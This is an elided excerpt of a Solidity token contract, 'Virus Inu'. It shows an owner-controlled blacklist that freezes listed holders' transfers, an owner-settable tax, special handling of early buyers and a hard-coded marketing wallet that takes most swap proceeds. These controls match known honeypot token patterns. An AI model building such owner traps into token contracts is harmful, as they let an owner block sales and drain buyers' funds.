...
contract Virus is Context, IERC20, Ownable {
    ...
    string private _name = "Virus Inu";
    string private _symbol = "Virus";
    uint8 private _decimals = 9;

    address payable public marketingWallet = payable(0x88888830fd2E994946A3686b7Ac2b2e2C100C5dA);
    ...
    mapping(address => bool) public _doNotLikeYou;
    ...
    function setTax(uint256 marketingFee, uint256 totalTax) external onlyOwner() {
    ...
    function doNotLikeYouAddress(address account, bool value) external onlyOwner{
        _doNotLikeYou[account] = value;
    }

    function setMultipuleDoNotLikeYoulist(address[] calldata accounts, bool value) public onlyOwner {
        for(uint256 i = 0; i < accounts.length; i++) {
            _doNotLikeYou[accounts[i]] = value;
        }
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        require(!_doNotLikeYou[sender] && !_doNotLikeYou[recipient], 'doNotLikeYou address');

        if(startBlock == 0 && isMarketPair[recipient]) startBlock = block.number;
        if(!isMarketPair[recipient] && isMarketPair[sender] && block.number < startBlock + 10){
    ...
    function swapAndLiquify(uint256 tAmount) private lockTheSwap {
        ...
        uint256 amountBNBForMarketing = BNBBalance.mul(3).div(4);
